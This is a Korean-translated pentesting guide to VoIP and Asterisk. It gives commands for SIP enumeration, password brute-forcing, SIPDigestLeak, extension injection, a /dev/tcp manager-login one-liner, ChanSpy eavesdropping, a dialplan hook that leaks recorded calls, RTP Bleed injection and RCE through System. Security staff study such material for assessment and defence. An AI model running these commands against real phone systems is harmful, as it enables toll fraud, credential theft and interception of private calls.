# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}


## VoIP 기본 정보

VoIP 작동 방식에 대해 배우기 시작하려면 다음을 확인하세요:

{{#ref}}
basic-voip-protocols/
{{#endref}}

## 기본 메시지
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xx—임시 응답**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—성공적인 응답**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—리다이렉션 응답**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—클라이언트 실패 응답**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—서버 실패 응답**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—전역 실패 응답**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telephone Numbers

Red Team이 수행할 수 있는 첫 번째 단계 중 하나는 OSINT 도구, Google 검색 또는 웹 페이지 스크래핑을 사용하여 회사에 연락할 수 있는 전화번호를 검색하는 것입니다.

전화번호를 확보한 후에는 온라인 서비스를 사용하여 운영자를 식별할 수 있습니다:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

운영자가 VoIP 서비스를 제공하는지 알면 회사가 VoIP를 사용하고 있는지 식별할 수 있습니다... 게다가, 회사가 VoIP 서비스를 계약하지 않았지만 PSTN 카드를 사용하여 자체 VoIP PBX를 전통적인 전화 네트워크에 연결하고 있을 가능성도 있습니다.

음악의 자동 응답과 같은 것들은 일반적으로 VoIP가 사용되고 있음을 나타냅니다.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT 정보

VoIP 소프트웨어를 식별하는 데 도움이 되는 다른 OSINT 열거는 Red Team에 유용할 것입니다.

### 네트워크 열거

- **`nmap`**은 UDP 서비스를 스캔할 수 있지만, 스캔되는 UDP 서비스의 수 때문에 매우 느리고 이러한 종류의 서비스에 대해 정확하지 않을 수 있습니다.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** from SIPVicious (`sudo apt install sipvicious`): 지정된 네트워크에서 SIP 서비스를 찾습니다.
- `svmap`은 User-Agent `friendly-scanner`를 사용하기 때문에 **차단하기 쉽습니다**, 하지만 `/usr/share/sipvicious/sipvicious`의 코드를 수정하고 변경할 수 있습니다.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS 스캔은 UDP, TCP 또는 TLS를 통한 SIP 서비스에 대한 매우 빠른 스캐너입니다. 멀티스레드를 사용하며 대규모 네트워크 범위를 스캔할 수 있습니다. 포트 범위를 쉽게 지정하고, TCP 및 UDP를 모두 스캔하며, 다른 방법을 사용할 수 있고(기본적으로 OPTIONS를 사용함), 다른 User-Agent를 지정할 수 있습니다(기타 등등).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### 추가 네트워크 열거

PBX는 다음과 같은 다른 네트워크 서비스를 노출할 수 있습니다:

- **69/UDP (TFTP)**: 펌웨어 업데이트
- **80 (HTTP) / 443 (HTTPS)**: 웹에서 장치를 관리하기 위해
- **389 (LDAP)**: 사용자 정보를 저장하는 대안
- **3306 (MySQL)**: MySQL 데이터베이스
- **5038 (Manager)**: 다른 플랫폼에서 Asterisk를 사용할 수 있게 함
- **5222 (XMPP)**: Jabber를 사용한 메시지
- 기타...

### 방법 열거

`SIPPTS enumerate`를 사용하여 PBX에서 **사용 가능한 방법**을 찾는 것이 가능합니다. [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### 서버 응답 분석

서버가 우리에게 보내는 헤더를 분석하는 것은 우리가 보내는 메시지와 헤더의 유형에 따라 매우 중요합니다. [**sippts**](https://github.com/Pepelux/sippts)의 `SIPPTS send`를 사용하면 모든 헤더를 조작하여 개인화된 메시지를 보낼 수 있으며, 응답을 분석할 수 있습니다.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
서버가 웹소켓을 사용하는 경우 데이터 수집이 가능합니다. [**sippts**](https://github.com/Pepelux/sippts)의 `SIPPTS wssend`를 사용하여 개인화된 WS 메시지를 보낼 수 있습니다.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

PBX(사설 교환기) 시스템에서 확장은 **조직이나 비즈니스 내의 개별** 전화선, 장치 또는 사용자에게 할당된 **고유한 내부 식별자**를 의미합니다. 확장은 각 사용자나 장치에 대한 개별 외부 전화번호 없이 **조직 내에서 전화를 효율적으로 라우팅**할 수 있게 해줍니다.

- **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`는 무료 SIP PBX 확장선 스캐너입니다. 개념적으로 전통적인 워드다이얼러와 유사하게 **확장 범위 또는 주어진 확장 목록을 추측**하여 작동합니다.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten은 SIP 서버에서 확장을 식별합니다. Sipexten은 대규모 네트워크 및 포트 범위를 확인할 수 있습니다.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit**: metasploit을 사용하여 확장/사용자 이름을 열거할 수도 있습니다:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX**는 Inter Asterisk Exchange 프로토콜 **사용자 이름 무차별 대입 열거기**입니다. enumIAX는 두 가지 모드에서 작동할 수 있습니다; 순차적 사용자 이름 추측 또는 사전 공격.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP 공격

### 비밀번호 무차별 대입 - 온라인

**PBX**와 일부 **확장/사용자 이름**을 발견한 후, Red Team은 일반 비밀번호 사전을 사용하여 인증을 무차별 대입하기 위해 **`REGISTER` 방법**을 통해 확장에 인증을 시도할 수 있습니다.

> [!CAUTION]
> **사용자 이름**이 확장과 동일할 수 있지만, 이 관행은 PBX 시스템, 구성 및 조직의 선호도에 따라 다를 수 있습니다...
>
> 사용자 이름이 확장과 동일하지 않은 경우, **무차별 대입을 위해 사용자 이름을 알아내야 합니다**.

- **`svcrack`** from SIPVicious (`sudo apt install sipvicious`): SVCrack은 PBX에서 특정 사용자 이름/확장에 대한 비밀번호를 크랙할 수 있게 해줍니다.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack은 SIP 서비스용 원격 비밀번호 크래커입니다. Rcrack은 여러 사용자에 대해 다양한 IP 및 포트 범위에서 비밀번호를 테스트할 수 있습니다.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIP Sniffing

**Open Wifi 네트워크** 내에서 VoIP 장비를 발견하면 **모든 정보를 스니핑**할 수 있습니다. 또한, 더 폐쇄된 네트워크(이더넷 또는 보호된 Wifi에 연결된 경우) 내에서는 **PBX와 게이트웨이** 사이에서 **MitM 공격**인 [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing)을 수행하여 정보를 스니핑할 수 있습니다.

네트워크 정보 중에는 장비를 관리하기 위한 **웹 자격 증명**, 사용자 **내선**, **사용자 이름**, **IP** 주소, 심지어 **해시된 비밀번호**와 **RTP 패킷**이 포함되어 있어 **대화를 들을 수** 있습니다.

이 정보를 얻기 위해 Wireshark, tcpdump와 같은 도구를 사용할 수 있지만, VoIP 대화를 스니핑하기 위해 **특별히 제작된 도구는** [**ucsniff**](https://github.com/Seabreg/ucsniff)입니다.

> [!CAUTION]
> **SIP 통신에 TLS가 사용되는 경우** SIP 통신을 명확하게 볼 수 없습니다.\
> **SRTP** 및 **ZRTP**가 사용되는 경우에도 **RTP 패킷은 평문으로 존재하지 않습니다**.

#### SIP 자격 증명 (비밀번호 브루트 포스 - 오프라인)

[**SIP REGISTER 통신**을 더 잘 이해하기 위한 이 예제를 확인하세요](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) **자격 증명이 어떻게 전송되는지** 배우세요.

- **`sipdump`** & **`sipcrack`,** **sipcrack**의 일부(`apt-get install sipcrack`): 이 도구들은 SIP 프로토콜 내에서 **다이제스트 인증**을 **추출**하고 **브루트 포스**할 수 있습니다.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump는 pcap 파일에서 다이제스트 인증을 추출할 수 있습니다.
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack은 SIPPTS 덤프에서 얻은 다이제스트 인증을 크랙하는 도구입니다.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark는 PCAP 파일에서 SIP 프로토콜의 데이터를 추출합니다.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF 코드

**SIP 자격 증명**뿐만 아니라 네트워크 트래픽에서 **음성 메일**에 접근하는 데 사용되는 DTMF 코드를 찾는 것도 가능합니다.\
이 코드는 **INFO SIP 메시지**, **오디오** 또는 **RTP 패킷** 내에서 전송할 수 있습니다. RTP 패킷 내에 코드가 있는 경우, 대화의 해당 부분을 잘라내고 multimo 도구를 사용하여 추출할 수 있습니다:
```bash
multimon -a DTMF -t wac pin.wav
```
### 무료 통화 / Asterisk 연결 잘못 구성

Asterisk에서는 **특정 IP 주소**에서의 연결을 허용하거나 **모든 IP 주소**에서의 연결을 허용할 수 있습니다:
```
host=10.10.10.10
host=dynamic
```
IP 주소가 지정되면, 호스트는 **REGISTER** 요청을 가끔씩 보낼 필요가 없습니다 (REGISTER 패킷에는 일반적으로 30분의 생존 시간이 포함되어 있어, 다른 시나리오에서는 전화가 30분마다 REGISTER를 해야 합니다). 그러나 VoIP 서버에서 전화를 받을 수 있도록 연결을 허용하는 열린 포트가 필요합니다.

사용자를 정의할 때 다음과 같이 정의할 수 있습니다:

- **`type=user`**: 사용자는 전화만 받을 수 있습니다.
- **`type=friend`**: 피어로 전화를 걸고 사용자로서 받을 수 있습니다 (확장과 함께 사용됨)
- **`type=peer`**: 피어로 전화를 보내고 받을 수 있습니다 (SIP-trunks)

신뢰를 설정하는 것도 가능합니다:

- **`insecure=port`**: IP로 검증된 피어 연결을 허용합니다.
- **`insecure=invite`**: INVITE 메시지에 대한 인증이 필요하지 않습니다.
- **`insecure=port,invite`**: 둘 다

> [!WARNING]
> **`type=friend`**가 사용될 때, **host** 변수의 **값**은 **사용되지 않으므로**, 관리자가 그 값을 사용하여 **SIP-trunk를 잘못 구성하면**, **누구나 연결할 수 있게 됩니다**.
>
> 예를 들어, 이 구성은 취약할 것입니다:\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### 무료 통화 / Asterisks 컨텍스트 잘못 구성

Asterisk에서 **컨텍스트**는 다이얼 플랜에서 **관련된 확장, 동작 및 규칙을 그룹화하는 이름이 있는 컨테이너 또는 섹션**입니다. 다이얼 플랜은 Asterisk 시스템의 핵심 구성 요소로, **수신 및 발신 전화를 처리하고 라우팅하는 방법을 정의합니다**. 컨텍스트는 다이얼 플랜을 구성하고, 접근 제어를 관리하며, 시스템의 서로 다른 부분 간의 분리를 제공합니다.

각 컨텍스트는 구성 파일, 일반적으로 **`extensions.conf`** 파일에 정의됩니다. 컨텍스트는 대괄호로 표시되며, 그 안에 컨텍스트 이름이 포함됩니다. 예를 들어:
```bash
csharpCopy code[my_context]
```
내부 컨텍스트에서, 당신은 확장(다이얼된 번호의 패턴)을 정의하고 이를 일련의 동작이나 애플리케이션과 연관시킵니다. 이러한 동작은 통화가 처리되는 방식을 결정합니다. 예를 들어:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
이 예제는 "my_context"라는 간단한 컨텍스트와 "100"이라는 확장을 보여줍니다. 누군가 100번으로 전화를 걸면, 통화가 연결되고, 환영 메시지가 재생된 후 통화가 종료됩니다.

이것은 **다른 컨텍스트**로, **다른 번호로 전화를 걸 수 있게** 합니다:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
관리자가 **기본 컨텍스트**를 다음과 같이 정의하면:
```
[default]
include => my_context
include => external
```
> [!WARNING]
> 누구나 **서버를 사용하여 다른 번호로 전화를 걸 수 있습니다** (서버의 관리자가 통화 요금을 지불하게 됩니다).

> [!CAUTION]
> 게다가 기본적으로 **`sip.conf`** 파일에는 **`allowguest=true`**가 포함되어 있어, **인증 없이** **모든** 공격자가 다른 번호로 전화를 걸 수 있습니다.

- **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite는 **PBX 서버가 인증 없이 전화를 걸 수 있도록 허용하는지** 확인합니다. SIP 서버의 구성이 잘못된 경우, 외부 번호로 전화를 걸 수 있도록 허용합니다. 또한 두 번째 외부 번호로 전화를 전환할 수 있도록 허용할 수도 있습니다.

예를 들어, Asterisk 서버에 잘못된 컨텍스트 구성이 있는 경우, 인증 없이 INVITE 요청을 수락할 수 있습니다. 이 경우, 공격자는 사용자/비밀번호를 알지 못해도 전화를 걸 수 있습니다.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### 무료 통화 / 잘못 구성된 IVRS

IVRS는 **Interactive Voice Response System**의 약자로, 사용자가 음성 또는 터치톤 입력을 통해 컴퓨터화된 시스템과 상호작용할 수 있게 해주는 전화 기술입니다. IVRS는 정보를 제공하고, 전화를 라우팅하며, 사용자 입력을 캡처하는 등 다양한 기능을 제공하는 **자동화된 통화 처리** 시스템을 구축하는 데 사용됩니다.

VoIP 시스템의 IVRS는 일반적으로 다음으로 구성됩니다:

1. **음성 프롬프트**: 사용자가 IVR 메뉴 옵션과 지침을 안내받을 수 있도록 하는 미리 녹음된 오디오 메시지.
2. **DTMF** (Dual-Tone Multi-Frequency) 신호: 전화 키를 눌러 생성된 터치톤 입력으로, IVR 메뉴를 탐색하고 입력을 제공하는 데 사용됩니다.
3. **통화 라우팅**: 사용자 입력에 따라 특정 부서, 상담원 또는 내선으로 전화를 적절한 목적지로 안내합니다.
4. **사용자 입력 캡처**: 발신자로부터 계좌 번호, 사건 ID 또는 기타 관련 데이터를 수집합니다.
5. **외부 시스템과의 통합**: IVR 시스템을 데이터베이스나 다른 소프트웨어 시스템에 연결하여 정보를 액세스하거나 업데이트하고, 작업을 수행하거나 이벤트를 트리거합니다.

Asterisk VoIP 시스템에서는 다이얼 플랜 (**`extensions.conf`** 파일)과 `Background()`, `Playback()`, `Read()` 등의 다양한 애플리케이션을 사용하여 IVR을 생성할 수 있습니다. 이러한 애플리케이션은 음성 프롬프트를 재생하고, 사용자 입력을 캡처하며, 통화 흐름을 제어하는 데 도움을 줍니다.

#### 취약한 구성의 예
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
이전 예시는 사용자가 **부서를 호출하려면 1을 누르고**, **다른 부서를 호출하려면 2를 누르거나**, **알고 있는 경우 전체 내선 번호를 입력하도록 요청받는 경우입니다.**\
취약점은 지정된 **내선 길이가 확인되지 않기 때문에 사용자가 5초 타임아웃을 입력하여 전체 번호를 입력할 수 있고, 호출될 수 있다는 점입니다.**

### 내선 주입

다음과 같은 내선을 사용하여:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**는 호출될 **extension**이며, **ext 101이 도입되면** 다음과 같은 일이 발생합니다:
```scss
exten => 101,1,Dial(SIP/101)
```
그러나 **`${EXTEN}`**이 **숫자 이외의 것**을 입력할 수 있게 허용한다면(구버전 Asterisk와 같이), 공격자는 **`101&SIP123123123`**을 입력하여 전화번호 123123123으로 전화를 걸 수 있습니다. 그리고 그 결과는 다음과 같습니다:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
따라서, **`101`** 및 **`123123123`**로의 호출이 전송되며, 첫 번째 호출만 연결됩니다... 그러나 공격자가 **일치하는 항목을 우회하는 확장자를 사용**하지만 존재하지 않는 경우, 그는 **원하는 번호로만 전화를 주입할 수 있습니다**.

## SIPDigestLeak 취약점

SIP Digest Leak는 하드웨어 및 소프트웨어 IP 전화와 전화 어댑터(VoIP에서 아날로그로) 등 많은 SIP 전화에 영향을 미치는 취약점입니다. 이 취약점은 **비밀번호로부터 계산된 Digest 인증 응답의 유출**을 허용합니다. **오프라인 비밀번호 공격이 가능**하며, 챌린지 응답을 기반으로 대부분의 비밀번호를 복구할 수 있습니다.

**[여기서 취약점 시나리오**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP 전화(피해자)는 어떤 포트(예: 5060)에서 전화를 수신 대기 중입니다.
2. 공격자가 IP 전화에 INVITE를 보냅니다.
3. 피해자 전화가 울리기 시작하고 누군가 전화를 받고 끊습니다(상대방이 전화를 받지 않기 때문에).
4. 전화가 끊어지면, **피해자 전화가 공격자에게 BYE를 보냅니다**.
5. **공격자가 407 응답을 발행**하여 **인증을 요청**하고 인증 챌린지를 발행합니다.
6. **피해자 전화가 두 번째 BYE에서 인증 챌린지에 대한 응답을 제공합니다**.
7. **공격자는 자신의 로컬 머신(또는 분산 네트워크 등)에서 챌린지 응답에 대한 무차별 대입 공격을 수행**하고 비밀번호를 추측할 수 있습니다.

- **SIPPTS 유출** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS 유출은 많은 SIP 전화에 영향을 미치는 SIP Digest Leak 취약점을 악용합니다. 출력은 SipCrack 형식으로 저장되어 SIPPTS dcrack 또는 SipCrack 도구를 사용하여 무차별 대입 공격을 수행할 수 있습니다.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call은 **웹 사용자**가 (예를 들어, 제품에 관심이 있을 수 있는) **전화번호**를 입력하여 전화를 받을 수 있도록 합니다. 그러면 상업적인 전화가 걸리고, 사용자가 **전화를 받으면** **에이전트와 연결**됩니다.

이와 관련된 일반적인 Asterisk 프로필은:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- 이전 프로필은 **모든 IP 주소가 연결할 수 있도록 허용**하고 있습니다 (비밀번호가 알려진 경우).
- 이전에 명시된 대로 **전화를 조직하기 위해**는 **읽기 권한이 필요하지 않으며** **오직** **쓰기**에서 **발신**만 필요합니다.

이러한 권한으로 비밀번호를 아는 모든 IP가 연결하여 너무 많은 정보를 추출할 수 있습니다, 예를 들어:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**더 많은 정보나 조치를 요청할 수 있습니다.**

### **도청**

Asterisk에서는 **`ChanSpy`** 명령어를 사용하여 **모니터링할 내선**(또는 모든 내선)을 지정하여 진행 중인 대화를 들을 수 있습니다. 이 명령어는 내선에 할당되어야 합니다.

예를 들어, **`exten => 333,1,ChanSpy('all',qb)`**는 **내선 333**으로 **전화**를 걸면 **모든** 내선을 **모니터링**하고, 새로운 대화가 시작될 때마다 (**`b`**) 조용한 모드(**`q`**)로 **듣기 시작**함을 나타냅니다. 우리는 이에 상호작용하고 싶지 않기 때문입니다. **`*`**를 눌러서 또는 내선 번호를 입력하여 진행 중인 대화에서 다른 대화로 이동할 수 있습니다.

**`ExtenSpy`**를 사용하여 하나의 내선만 모니터링하는 것도 가능합니다.

대화를 듣는 대신, 다음과 같은 내선을 사용하여 **파일에 기록**할 수 있습니다:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
통화는 **`/tmp`**에 저장됩니다.

Asterisk가 종료될 때 통화를 **유출하는 스크립트를 실행**하도록 만들 수도 있습니다.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed 취약점

**RTCPBleed**는 Asterisk 기반 VoIP 서버에 영향을 미치는 주요 보안 문제입니다(2017년에 발표됨). 이 취약점은 **VoIP 대화를 전달하는 RTP(Real Time Protocol) 트래픽**이 **인터넷의 누구에 의해 가로채지고 리디렉션될 수 있도록** 허용합니다. 이는 RTP 트래픽이 NAT(네트워크 주소 변환) 방화벽을 통과할 때 인증을 우회하기 때문에 발생합니다.

RTP 프록시는 두 개 이상의 당사자 간의 RTP 스트림을 프록시하여 RTC 시스템에 영향을 미치는 **NAT 제한**을 해결하려고 합니다. NAT가 있는 경우, RTP 프록시 소프트웨어는 종종 신호(signalling)를 통해 검색된 RTP IP 및 포트 정보를 신뢰할 수 없습니다(예: SIP). 따라서 여러 RTP 프록시가 **IP 및 포트 튜플을 자동으로 학습하는** 메커니즘을 구현했습니다. 이는 종종 들어오는 RTP 트래픽을 검사하고 들어오는 RTP 트래픽의 출처 IP 및 포트를 응답해야 할 것으로 표시하는 방식으로 수행됩니다. 이 메커니즘은 "학습 모드"라고 불릴 수 있으며, **어떠한 종류의 인증도 사용하지 않습니다**. 따라서 **공격자**는 **RTP 프록시로 RTP 트래픽을 전송하고** 진행 중인 RTP 스트림의 발신자 또는 수신자를 위해 전송될 RTP 트래픽을 받을 수 있습니다. 이 취약점을 RTP Bleed라고 부르는 이유는 공격자가 합법적인 사용자에게 전송될 RTP 미디어 스트림을 받을 수 있게 해주기 때문입니다.

RTP 프록시와 RTP 스택의 또 다른 흥미로운 행동은 때때로 **RTP Bleed에 취약하지 않더라도** **모든 출처의 RTP 패킷을 수락하고 전달 및/또는 처리**한다는 것입니다. 따라서 공격자는 합법적인 미디어 대신 자신의 미디어를 주입할 수 있는 RTP 패킷을 보낼 수 있습니다. 이 공격을 RTP 주입이라고 부르며, 이는 기존 RTP 스트림에 불법적인 RTP 패킷을 주입할 수 있게 해줍니다. 이 취약점은 RTP 프록시와 엔드포인트 모두에서 발견될 수 있습니다.

Asterisk와 FreePBX는 전통적으로 **`NAT=yes` 설정**을 사용하여 RTP 트래픽이 인증을 우회하도록 하여 통화에서 오디오가 없거나 일방향 오디오가 발생할 수 있습니다.

자세한 정보는 [https://www.rtpbleed.com/](https://www.rtpbleed.com/)를 확인하세요.

- **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed는 RTP 스트림을 전송하여 RTP Bleed 취약점을 감지합니다.
```bash
sippts rtpbleed -i 10.10.0.10
```
- **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed는 RTCP 스트림을 전송하여 RTP Bleed 취약점을 감지합니다.
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood는 RTP 스트림을 전송하여 RTP Bleed 취약점을 악용합니다.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject는 오디오 파일(WAV 형식)을 주입하여 RTP Bleed 취약점을 악용합니다.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asterisk에서 어떻게든 **확장 규칙을 추가하고 다시 로드**할 수 있다면(예: 취약한 웹 관리자 서버를 타겟으로 삼아), **`System`** 명령을 사용하여 RCE를 얻을 수 있습니다.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

> [!WARNING]
> If the server is **특정 문자의 사용을 허용하지 않는 경우** in the **`System`** command (like in Elastix), check if the web server allows to **시스템 내에서 파일을 생성할 수 있는지 확인하고** (like in Elastix or trixbox), and use it to **백도어 스크립트를 생성하고** then use **`System`** to **실행** that **스크립트**.

#### Interesting local files and permissions

